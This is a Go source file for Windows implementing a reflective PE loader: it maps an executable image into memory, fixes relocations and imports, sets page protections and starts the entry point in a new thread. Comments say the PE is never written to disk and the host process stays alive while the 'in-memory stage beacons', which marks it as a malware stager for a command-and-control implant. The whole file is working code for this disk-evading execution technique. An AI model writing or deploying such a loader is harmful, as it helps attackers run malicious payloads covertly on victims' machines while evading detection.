//go:build windows

package main

import (
	"encoding/binary"
	"fmt"
	"unsafe"

	"golang.org/x/sys/windows"
)

const (
	memCommit              = 0x1000
	memReserve             = 0x2000
	pageReadWrite   uint32 = 0x04
	pageExecuteRead uint32 = 0x20
	pageReadOnly    uint32 = 0x02

	imageScnMemExecutable = 0x20000000
	imageScnMemWrite      = 0x80000000

	imageRelBasedir64 = 10
)

// RunPE maps the given PE image into memory, resolves its imports and
// relocations, then starts it in a new thread at its entry point.
// The PE is never written to disk.
func RunPE(buf []byte) error {
	if len(buf) < 64 {
		return fmt.Errorf("buffer too small")
	}
	if binary.LittleEndian.Uint16(buf[0:2]) != 0x5A4D { // MZ
		return fmt.Errorf("not a PE (MZ)")
	}
	eLfanew := binary.LittleEndian.Uint32(buf[0x3C:0x40])
	if eLfanew+4 > uint32(len(buf)) {
		return fmt.Errorf("bad e_lfanew")
	}
	if binary.LittleEndian.Uint32(buf[eLfanew:eLfanew+4]) != 0x00004550 { // PE\0\0
		return fmt.Errorf("not a PE (PE)")
	}

	coffOff := eLfanew + 4
	optOff := coffOff + 20
	magic := binary.LittleEndian.Uint16(buf[optOff : optOff+2])
	if magic != 0x20B { // PE32+
		return fmt.Errorf("only PE32+ supported (magic 0x%x)", magic)
	}

	imageBase := binary.LittleEndian.Uint64(buf[optOff+24 : optOff+32])
	sizeOfImage := binary.LittleEndian.Uint32(buf[optOff+56 : optOff+60])
	sizeOfHeaders := binary.LittleEndian.Uint32(buf[optOff+60 : optOff+64])
	addressOfEntryPoint := binary.LittleEndian.Uint32(buf[optOff+16 : optOff+20])
	numberOfSections := binary.LittleEndian.Uint16(buf[coffOff+2 : coffOff+4])
	sizeOfOptionalHeader := binary.LittleEndian.Uint16(buf[coffOff+16 : coffOff+18])
	sectionOff := optOff + uint32(sizeOfOptionalHeader)

	dataDirOff := optOff + 112
	importDirRVA := binary.LittleEndian.Uint32(buf[dataDirOff+8 : dataDirOff+12]) // index 1
	importDirSize := binary.LittleEndian.Uint32(buf[dataDirOff+12 : dataDirOff+16])
	relocDirRVA := binary.LittleEndian.Uint32(buf[dataDirOff+40 : dataDirOff+44]) // index 5
	relocDirSize := binary.LittleEndian.Uint32(buf[dataDirOff+44 : dataDirOff+48])

	// Allocate. Try the preferred base first; if taken, allocate
	// anywhere and apply relocations.
	base, err := windows.VirtualAlloc(uintptr(imageBase), uintptr(sizeOfImage), memCommit|memReserve, pageReadWrite)
	if err != nil || base == 0 {
		base, err = windows.VirtualAlloc(0, uintptr(sizeOfImage), memCommit|memReserve, pageReadWrite)
		if err != nil || base == 0 {
			return fmt.Errorf("VirtualAlloc failed: %v", err)
		}
	}
	allocBase := uintptr(base)
	basePtr := unsafe.Pointer(allocBase)

	// Copy headers.
	copy(toSlice(basePtr, uintptr(sizeOfHeaders)), buf[:sizeOfHeaders])

	// Copy sections.
	for i := uint16(0); i < numberOfSections; i++ {
		off := sectionOff + uint32(i)*40
		va := binary.LittleEndian.Uint32(buf[off+12 : off+16])
		raw := binary.LittleEndian.Uint32(buf[off+20 : off+24])
		size := binary.LittleEndian.Uint32(buf[off+16 : off+20])

		end := raw + size
		if size > 0 && uint32(len(buf)) >= end {
			copy(toSlice(unsafe.Add(basePtr, va), uintptr(size)), buf[raw:end])
		}
	}

	// Relocations (only if loaded away from the preferred base).
	delta := int64(allocBase) - int64(imageBase)
	if delta != 0 && relocDirSize > 0 {
		applyRelocations(basePtr, relocDirRVA, relocDirSize, delta)
	}

	// Resolve imports.
	if importDirSize > 0 {
		if err := resolveImports(basePtr, importDirRVA, importDirSize); err != nil {
			return fmt.Errorf("import resolution: %v", err)
		}
	}

	// Set final section protections (copy happened under RW).
	for i := uint16(0); i < numberOfSections; i++ {
		off := sectionOff + uint32(i)*40
		va := binary.LittleEndian.Uint32(buf[off+12 : off+16])
		vsize := binary.LittleEndian.Uint32(buf[off+8 : off+12])
		chars := binary.LittleEndian.Uint32(buf[off+36 : off+40])

		prot := pageReadWrite
		switch {
		case chars&imageScnMemExecutable != 0:
			prot = pageExecuteRead
		case chars&imageScnMemWrite != 0:
			prot = pageReadWrite
		default:
			prot = pageReadOnly
		}
		var old uint32
		windows.VirtualProtect(allocBase+uintptr(va), uintptr(vsize), prot, &old)
	}

	entry := allocBase + uintptr(addressOfEntryPoint)
	thread, err := createThread(entry)
	if err != nil {
		return fmt.Errorf("CreateThread: %v", err)
	}

	// Keep this host process alive while the in-memory stage beacons.
	windows.WaitForSingleObject(thread, windows.INFINITE)
	return nil
}

func createThread(entry uintptr) (windows.Handle, error) {
	kernel32 := windows.NewLazySystemDLL("kernel32.dll")
	proc := kernel32.NewProc("CreateThread")
	r, _, err := proc.Call(0, 0, entry, 0, 0, 0)
	if r == 0 {
		return 0, err
	}
	return windows.Handle(r), nil
}

func applyRelocations(base unsafe.Pointer, dirRVA, dirSize uint32, delta int64) {
	pos := unsafe.Add(base, dirRVA)
	end := unsafe.Add(base, uintptr(dirRVA)+uintptr(dirSize))
	for uintptr(pos) < uintptr(end) {
		pageRVA := *(*uint32)(pos)
		blockSize := *(*uint32)(unsafe.Add(pos, 4))
		if blockSize == 0 {
			break
		}
		count := (blockSize - 8) / 2
		entries := unsafe.Add(pos, 8)
		for i := uint32(0); i < count; i++ {
			entry := *(*uint16)(unsafe.Add(entries, uintptr(i)*2))
			type_ := entry >> 12
			offset := entry & 0xFFF
			if type_ == imageRelBasedir64 {
				loc := unsafe.Add(base, uintptr(pageRVA)+uintptr(offset))
				val := *(*uint64)(loc)
				val += uint64(delta)
				*(*uint64)(loc) = val
			}
			// type 0 (ABSOLUTE) is skipped; other types unused on x64.
		}
		pos = unsafe.Add(pos, uintptr(blockSize))
	}
}

func resolveImports(base unsafe.Pointer, dirRVA, dirSize uint32) error {
	pos := unsafe.Add(base, dirRVA)
	end := unsafe.Add(base, uintptr(dirRVA)+uintptr(dirSize))
	for uintptr(pos) < uintptr(end) {
		origFirstThunk := *(*uint32)(pos)
		nameRVA := *(*uint32)(unsafe.Add(pos, 12))
		firstThunk := *(*uint32)(unsafe.Add(pos, 16))
		if origFirstThunk == 0 && firstThunk == 0 {
			break
		}
		if nameRVA == 0 {
			pos = unsafe.Add(pos, 20)
			continue
		}

		dllName := readCString(unsafe.Add(base, nameRVA))
		mod, err := windows.LoadLibrary(dllName)
		if err != nil {
			return fmt.Errorf("LoadLibrary %s: %v", dllName, err)
		}

		ilt := origFirstThunk
		if ilt == 0 {
			ilt = firstThunk
		}
		i := uint32(0)
		for {
			thunkRVA := ilt + i*8
			thunkVal := *(*uint64)(unsafe.Add(base, thunkRVA))
			if thunkVal == 0 {
				break
			}

			var procAddr uintptr
			if thunkVal&0x8000000000000000 != 0 {
				// Ordinal import.
				ordinal := uint32(thunkVal & 0xFFFF)
				procAddr, err = getProcAddressOrdinal(mod, ordinal)
			} else {
				nameOff := unsafe.Add(base, uintptr(thunkVal)+2) // skip 2-byte hint
				procName := readCString(nameOff)
				procAddr, err = windows.GetProcAddress(mod, procName)
			}
			if err != nil {
				return fmt.Errorf("GetProcAddress: %v", err)
			}

			*(*uint64)(unsafe.Add(base, firstThunk+i*8)) = uint64(procAddr)
			i++
		}
		pos = unsafe.Add(pos, 20)
	}
	return nil
}

var kernel32 = windows.NewLazySystemDLL("kernel32.dll")
var procGetProcAddress = kernel32.NewProc("GetProcAddress")

func getProcAddressOrdinal(mod windows.Handle, ordinal uint32) (uintptr, error) {
	r, _, e := procGetProcAddress.Call(uintptr(mod), uintptr(ordinal))
	if r == 0 {
		return 0, e
	}
	return r, nil
}

func readCString(addr unsafe.Pointer) string {
	var b []byte
	for i := uintptr(0); ; i++ {
		c := *(*byte)(unsafe.Add(addr, i))
		if c == 0 {
			break
		}
		b = append(b, c)
	}
	return string(b)
}

func toSlice(ptr unsafe.Pointer, n uintptr) []byte {
	return (*[1 << 30]byte)(ptr)[:n:n]
}
